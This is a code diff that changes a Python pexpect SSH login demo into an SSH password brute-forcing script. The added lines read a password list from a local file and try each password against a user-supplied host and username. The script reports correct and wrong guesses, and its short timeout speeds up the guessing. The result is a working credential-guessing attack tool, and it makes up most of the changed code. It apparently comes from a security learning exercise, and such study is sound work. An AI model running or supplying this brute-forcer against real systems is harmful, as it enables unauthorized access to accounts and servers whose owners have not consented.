@@ -1,19 +1,14 @@
 #!/usr/bin/env python
 
-'''This demonstrates using the connect method from sshlogin.py and running an
-ls command on the SSH shell prompt.
+'''This demonstrates using the connect method from sshlogin.py and modifying
+it so that we can use a list of password from an external file to brute-force the 
+SSH login.
 '''
+
 
 import pexpect
 
-# List of prompts to expect from the shell.
 PROMPT = ['# ', '>>> ', '> ', '\$ ']
-
-# send_command uses the child to run commands and print the output to stdoutput.
-def send_command(child, command):
-  child.sendline(command)
-  child.expect(PROMPT)
-  print(child.before)
 
 # connect uses pexpect library to automate the ssh login and returns the ssh shell.
 def connect(host, user, password):
@@ -31,14 +26,24 @@ def connect(host, user, password):
        print('[-]Error Connecting to Remote Host')
        return
     child.sendline(password)
-    child.expect(PROMPT)
+    # 
+    child.expect(PROMPT, timeout=0.5)
     return child
 
 def main():
   host = input("Enter the host information: ")
   user = input("Enter your SSH username: ")
   password = input("Enter your SSH password: ")
-  child = connect(host, user, password)
-  send_command(child, 'ls')
+
+  # password_file is the file where you'll place the password list for bruteforcing SSH login
+  with open('password_file') as passwords:
+    for password in passwords:
+      password = password.strip('\n')
+      try:
+        child = connect(host, user, password)
+        print(f'[+] Correct password: {password}')
+      except:
+         print(f'[+] Wrong password: {password}')
+
 
 main()
